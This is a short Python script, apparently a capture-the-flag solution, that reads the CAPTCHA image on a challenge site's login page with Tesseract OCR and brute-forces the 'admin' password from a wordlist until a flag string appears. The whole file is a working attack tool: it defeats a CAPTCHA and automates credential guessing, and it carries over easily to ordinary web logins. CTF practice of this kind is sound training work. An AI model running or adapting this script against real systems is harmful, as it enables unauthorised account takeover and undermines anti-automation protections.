from requests import session
from base64 import b64decode
from re import findall
from cv2 import imread
import pytesseract

def resolve(s, password):
    # Init
    url = "http://antibf.ec2qualifications.esaip-cyber.com/login"
    r = s.get(url)
    captcha = findall('data:image\/png;base64, (.*?)" alt="Captcha"', r.text)[0]
    captcha = b64decode(captcha)

    # Tmp save captcha
    with open(file="tmp.png", mode="wb") as file:
        file.write(captcha)

    # Tesseract
    openCV = imread("tmp.png")
    code = pytesseract.image_to_string(openCV)[:6]

    # Test creds
    data = {
        "username": "admin",
        "password": password,
        "captcha": code
    }
    r = s.post(url, data=data)

    # Return result
    if "R2Lille{" in r.text:
        return "Flag"
    elif "Wrong captcha!" in r.text:
        return "Wrong captcha!"
    else:
        return "Wrong credentials!"


if __name__ == "__main__":
    # Open wordlist
    with open(file="src/wordlist.txt", mode="r") as file:
        wordlist = file.read().split("\n")

    # Brute force
    s = session()
    for password in wordlist:
        print(f"\r\x1b[2K\x1b[1m[*] Testing password:\x1b[0m {password}", end="")
        res = resolve(s, password)
        while res == "Wrong captcha!":
            res = resolve(s, password)
        if res == "Flag":
            print(f"\n\n\x1b[1m=== Admin password has been found: \x1b[32m{password}\x1b[0m\x1b[1m ===\x1b[0m\n")
            break
